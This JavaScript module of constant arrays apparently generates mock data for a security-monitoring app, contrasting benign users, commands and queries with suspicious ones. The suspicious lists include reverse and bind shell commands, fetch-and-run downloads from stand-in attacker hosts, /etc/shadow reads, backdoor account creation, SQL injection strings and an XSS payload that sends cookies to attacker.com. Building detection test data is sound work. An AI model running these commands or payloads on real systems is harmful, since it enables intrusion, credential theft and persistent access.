export const USERNAMES = [
  'root', 'admin', 'administrator', 'guest', 'ubuntu', 'support', 'test',
  'developer', 'postgres', 'mysql', 'service', 'backup', 'oracle', 'user',
  'api_user', 'jenkins', 'git', 'deploy', 'system', 'webmaster', 'analyst'
];

export const BENIGN_USERNAMES = [
  'alice', 'bob', 'charlie', 'david', 'emma', 'frank', 'grace', 'henry',
  'isabella', 'jack', 'kate', 'liam', 'mia', 'nathan', 'olivia', 'peter',
  'rachel', 'sam', 'tara', 'victor', 'app_user', 'soc_dev'
];

export const SYSTEM_PROCESSES = [
  'systemd', 'sshd', 'nginx', 'postgres', 'dockerd', 'cron', 'rsyslogd',
  'udevd', 'dbus-daemon', 'kernel', 'snapd', 'auditd', 'containerd', 'ntpd'
];

export const BENIGN_COMMANDS = [
  'systemctl status nginx',
  'df -h',
  'free -m',
  'tail -n 50 /var/log/nginx/access.log',
  'ps aux | grep node',
  'cat /etc/hostname',
  'uptime',
  'netstat -tuln',
  'git pull origin main',
  'npm run build',
  'docker ps -a',
  'ls -la /var/www/html'
];

export const SUSPICIOUS_COMMANDS = [
  'sudo su -',
  'cat /etc/shadow',
  'whoami',
  'id',
  'uname -a',
  'curl -s http://malicious-site.com/backdoor.sh | bash',
  'wget http://199.199.199.199/shell.elf -O /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf',
  'nc -lvnp 4444 -e /bin/bash',
  'bash -i >& /dev/tcp/185.112.144.11/9001 0>&1',
  'echo "root:backdoor" | chpasswd',
  'find / -perm -4000 -type f 2>/dev/null',
  'useradd -m -g root -s /bin/bash backdoor_admin'
];

export const SQLI_PAYLOADS = [
  "1' OR 1=1 --",
  "1' UNION SELECT username, password FROM users --",
  "1; DROP TABLE incidents; --",
  "admin' --",
  "'; EXEC xp_cmdshell('whoami') --",
  "1' AND (SELECT 5621 FROM(SELECT COUNT(*),CONCAT(0x7176707a71,(SELECT (ELT(5621=5621,1))),0x7170707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
  "1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') --",
  "' OR '1'='1"
];

export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(document.cookie)>',
  '<svg/onload=alert(\'XSS\')>',
  'javascript:alert(1)',
  '<body onload=alert("XSS")>',
  '<iframe src="javascript:alert(`XSS`)">',
  '"><script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>'
];

export const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0'
];

export const MALICIOUS_USER_AGENTS = [
  'sqlmap/1.7.3#stable (https://sqlmap.org)',
  'Nmap Scripting Engine; https://nmap.org/book/nse.html',
  'Nikto/2.1.6',
  'Hydra/9.5',
  'Go-http-client/1.1',
  'DirBuster/1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)',
  'Wget/1.21.1',
  'curl/7.81.0'
];

export const BENIGN_DB_QUERIES = [
  'SELECT * FROM "User" WHERE id = 1;',
  'SELECT * FROM "Incident" WHERE status = \'NEW\' ORDER BY "createdAt" DESC LIMIT 10;',
  'INSERT INTO "SecurityLog" (source, "logLevel", message, details) VALUES (\'firewall\', \'INFO\', \'Allowed outbound TCP\', \'{}\');',
  'SELECT count(*) FROM "SecurityLog" WHERE timestamp > NOW() - INTERVAL \'1 hour\';',
  'SELECT i.*, u.name FROM "Incident" i LEFT JOIN "User" u ON i."userId" = u.id WHERE i.id = 45;',
  'UPDATE "Incident" SET status = \'INVESTIGATING\', "updatedAt" = NOW() WHERE id = 12;',
  'SELECT * FROM "DetectionRule" WHERE "isActive" = true;'
];

export const COMMON_PORTS = [
  { port: 80, service: 'http' },
  { port: 443, service: 'https' },
  { port: 22, service: 'ssh' },
  { port: 5432, service: 'postgresql' },
  { port: 3306, service: 'mysql' },
  { port: 8080, service: 'http-alt' },
  { port: 3389, service: 'rdp' },
  { port: 21, service: 'ftp' },
  { port: 23, service: 'telnet' },
  { port: 25, service: 'smtp' },
  { port: 53, service: 'dns' },
  { port: 445, service: 'microsoft-ds' },
  { port: 1433, service: 'ms-sql-s' },
  { port: 6379, service: 'redis' }
];
